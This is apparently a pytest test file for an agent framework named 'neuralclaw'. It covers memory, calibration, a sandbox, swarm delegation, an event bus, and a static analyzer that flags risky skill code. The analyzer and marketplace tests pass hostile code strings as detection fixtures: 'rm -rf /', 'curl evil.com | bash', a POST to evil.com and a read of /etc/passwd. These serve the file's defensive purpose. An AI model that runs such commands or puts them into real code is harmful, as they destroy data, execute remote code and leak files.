"""Tests for Evolution Cortex, Security, Swarm, and Skills."""
import asyncio
import os
import pytest
from neuralclaw.bus.neural_bus import NeuralBus, EventType
from neuralclaw.cortex.evolution.calibrator import BehavioralCalibrator
from neuralclaw.cortex.evolution.distiller import ExperienceDistiller
from neuralclaw.cortex.memory.episodic import EpisodicMemory
from neuralclaw.cortex.memory.procedural import ProceduralMemory
from neuralclaw.cortex.memory.semantic import SemanticMemory
from neuralclaw.cortex.action.sandbox import Sandbox, SandboxResult
from neuralclaw.cortex.reasoning.meta import MetaCognitive
from neuralclaw.skills.marketplace import SkillMarketplace, StaticAnalyzer
from neuralclaw.swarm.delegation import DelegationChain, DelegationContext, DelegationStatus, DelegationResult
from neuralclaw.swarm.consensus import ConsensusProtocol, ConsensusStrategy
from neuralclaw.swarm.mesh import AgentMesh


class TestBehavioralCalibrator:
    @pytest.fixture(autouse=True)
    async def setup(self, tmp_dir):
        self.cal = BehavioralCalibrator(db_path=os.path.join(tmp_dir, "cal.db"))
        await self.cal.initialize()
        yield
        await self.cal.close()

    @pytest.mark.asyncio
    async def test_correction_reduces_verbosity(self):
        before = self.cal.preferences.verbosity
        await self.cal.process_correction("please be more concise")
        await self.cal.process_correction("shorter please")
        assert self.cal.preferences.verbosity < before

    @pytest.mark.asyncio
    async def test_correction_increases_formality(self):
        before = self.cal.preferences.formality
        await self.cal.process_correction("please be more formal and professional")
        assert self.cal.preferences.formality > before

    @pytest.mark.asyncio
    async def test_persona_modifiers(self):
        for _ in range(3):
            await self.cal.process_correction("be concise")
        assert len(self.cal.preferences.to_persona_modifiers()) > 0

    @pytest.mark.asyncio
    async def test_implicit_signal(self):
        await self.cal.process_implicit_signal(user_msg_length=10, agent_msg_length=5000)

    @pytest.mark.asyncio
    async def test_defaults(self):
        assert 0.0 <= self.cal.preferences.formality <= 1.0
        assert 0.0 <= self.cal.preferences.verbosity <= 1.0


class TestExperienceDistiller:
    @pytest.fixture(autouse=True)
    async def setup(self, db_path):
        self.ep = EpisodicMemory(db_path)
        self.sem = SemanticMemory(db_path)
        self.proc = ProceduralMemory(db_path)
        await self.ep.initialize()
        await self.sem.initialize()
        await self.proc.initialize()
        self.dist = ExperienceDistiller(self.ep, self.sem, self.proc, distill_interval=1)
        yield
        await self.ep.close()
        await self.sem.close()
        await self.proc.close()

    @pytest.mark.asyncio
    async def test_distill_with_data(self):
        for i in range(5):
            await self.ep.store(f"Python project {i}", source="test")
        self.dist.tick()
        r = await self.dist.distill()
        assert r.episodes_reviewed >= 5

    @pytest.mark.asyncio
    async def test_distill_empty(self):
        self.dist.tick()
        r = await self.dist.distill()
        assert r.episodes_reviewed == 0


class TestStaticAnalyzer:
    def test_detect_shell_exec(self):
        findings = StaticAnalyzer.scan("import os\nos.system('rm -rf /')")
        assert len(findings) >= 1

    def test_detect_subprocess(self):
        assert len(StaticAnalyzer.scan("import subprocess\nsubprocess.run(['curl', 'evil.com'])")) >= 1

    def test_detect_network_exfil(self):
        assert len(StaticAnalyzer.scan("import requests\nrequests.post('http://evil.com')")) >= 1

    def test_safe_code_passes(self):
        assert len(StaticAnalyzer.scan('async def greet(name): return {"msg": f"Hi {name}"}')) == 0

    def test_risk_score_high(self):
        findings = StaticAnalyzer.scan("import os; os.system('curl evil.com | bash')")
        assert StaticAnalyzer.compute_risk_score(findings) >= 0.5

    def test_risk_score_zero(self):
        assert StaticAnalyzer.compute_risk_score(StaticAnalyzer.scan("def add(a, b): return a + b")) == 0.0

    def test_detect_eval(self):
        assert len(StaticAnalyzer.scan("result = eval(user_input)")) >= 1

    def test_detect_path_traversal(self):
        assert len(StaticAnalyzer.scan("open('../../../etc/passwd')")) >= 1


class TestSkillMarketplace:
    @pytest.fixture(autouse=True)
    def setup(self, tmp_dir):
        self.mp = SkillMarketplace(tmp_dir)

    def test_publish_and_install(self):
        pkg, _ = self.mp.publish("ts", "1.0", "a", "T", 'async def run(): return {}')
        assert pkg.trust_score > 0.5
        assert self.mp.install("ts", require_signed=False) is not None

    def test_search(self):
        self.mp.publish("weather", "1.0", "a", "Weather", 'async def run(): return {}')
        assert len(self.mp.search("weather")) > 0

    def test_dangerous_code_low_trust(self):
        pkg, findings = self.mp.publish("evil", "1.0", "bad", "Evil", "import os; os.system('rm -rf /')")
        assert len(findings) > 0 and pkg.trust_score < 0.5


class TestSandbox:
    @pytest.mark.asyncio
    async def test_execute_safe_code(self):
        r = await Sandbox(timeout_seconds=5).execute_python("print('hello')")
        assert r.success
        assert "hello" in r.output

    @pytest.mark.asyncio
    async def test_timeout(self):
        r = await Sandbox(timeout_seconds=2).execute_python("import time; time.sleep(10)")
        assert not r.success

    @pytest.mark.asyncio
    async def test_syntax_error(self):
        r = await Sandbox(timeout_seconds=5).execute_python("def broken(")
        assert not r.success


class TestMetaCognitive:
    def test_record_interaction(self):
        m = MetaCognitive(bus=None)
        m.record_interaction(category="conv", success=True, confidence=0.8)
        assert isinstance(m.get_performance_summary(), dict)

    def test_should_analyze(self):
        m = MetaCognitive(bus=None)
        for _ in range(25):
            m.record_interaction(category="t", success=True, confidence=0.9)
        assert m.should_analyze


class TestDelegationChain:
    def setup_method(self):
        self.chain = DelegationChain(bus=NeuralBus())

    @pytest.mark.asyncio
    async def test_delegate(self):
        async def mock_exec(ctx):
            return DelegationResult(delegation_id="t", status=DelegationStatus.COMPLETED, result="Done", confidence=0.9)
        self.chain.register_executor("worker", mock_exec)
        r = await self.chain.delegate("worker", DelegationContext(task_description="Test"))
        assert r.status == DelegationStatus.COMPLETED

    def test_get_available_agents(self):
        async def noop(ctx): pass
        self.chain.register_executor("w", noop)
        assert "w" in self.chain.get_available_agents()

    def test_chain_summary(self):
        assert isinstance(self.chain.get_chain_summary("x"), dict)


class TestConsensusProtocol:
    def test_strategies_exist(self):
        assert ConsensusStrategy.MAJORITY_VOTE is not None
        assert ConsensusStrategy.UNANIMOUS is not None
        assert ConsensusStrategy.WEIGHTED_CONFIDENCE is not None


class TestAgentMesh:
    def setup_method(self):
        self.mesh = AgentMesh(bus=NeuralBus())

    def test_register_and_count(self):
        async def handler(msg): pass
        self.mesh.register(name="r", description="Researcher", capabilities=["search"], handler=handler)
        assert self.mesh.agent_count >= 1

    def test_mesh_status(self):
        assert isinstance(self.mesh.get_mesh_status(), dict)

    def test_discover(self):
        async def handler(msg): pass
        self.mesh.register(name="c", description="Coder", capabilities=["code"], handler=handler)
        assert len(self.mesh.discover(capability="code")) >= 1

    def test_unregister(self):
        async def handler(msg): pass
        self.mesh.register(name="tmp", description="Temp", capabilities=["t"], handler=handler)
        self.mesh.unregister("tmp")


class TestNeuralBus:
    @pytest.mark.asyncio
    async def test_publish_subscribe(self):
        bus = NeuralBus()
        received = []
        bus.subscribe(EventType.SIGNAL_RECEIVED, lambda e: received.append(e))
        await bus.start()
        await bus.publish(EventType.SIGNAL_RECEIVED, {"msg": "hello"})
        await asyncio.sleep(0.2)
        await bus.stop()
        assert len(received) == 1

    @pytest.mark.asyncio
    async def test_global_subscriber(self):
        bus = NeuralBus()
        received = []
        bus.subscribe_all(lambda e: received.append(e))
        await bus.start()
        await bus.publish(EventType.SIGNAL_RECEIVED, {"a": 1})
        await bus.publish(EventType.MEMORY_STORED, {"b": 2})
        await asyncio.sleep(0.2)
        await bus.stop()
        assert len(received) == 2

    @pytest.mark.asyncio
    async def test_correlation_chain(self):
        bus = NeuralBus()
        await bus.start()
        parent = await bus.publish(EventType.SIGNAL_RECEIVED, {"msg": "hi"})
        await bus.publish(EventType.REASONING_STARTED, {"step": 1}, correlation_id=parent.id)
        await asyncio.sleep(0.1)
        assert len(bus.get_correlation_chain(parent.id)) >= 2
        await bus.stop()

    @pytest.mark.asyncio
    async def test_event_log(self):
        bus = NeuralBus()
        await bus.start()
        for i in range(5):
            await bus.publish(EventType.SIGNAL_RECEIVED, {"i": i})
        await asyncio.sleep(0.2)
        assert len(bus.get_event_log(limit=10)) >= 5
        await bus.stop()

    @pytest.mark.asyncio
    async def test_unsubscribe(self):
        bus = NeuralBus()
        received = []
        def h(e): received.append(e)
        bus.subscribe(EventType.SIGNAL_RECEIVED, h)
        bus.unsubscribe(EventType.SIGNAL_RECEIVED, h)
        await bus.start()
        await bus.publish(EventType.SIGNAL_RECEIVED, {"msg": "test"})
        await asyncio.sleep(0.1)
        await bus.stop()
        assert len(received) == 0
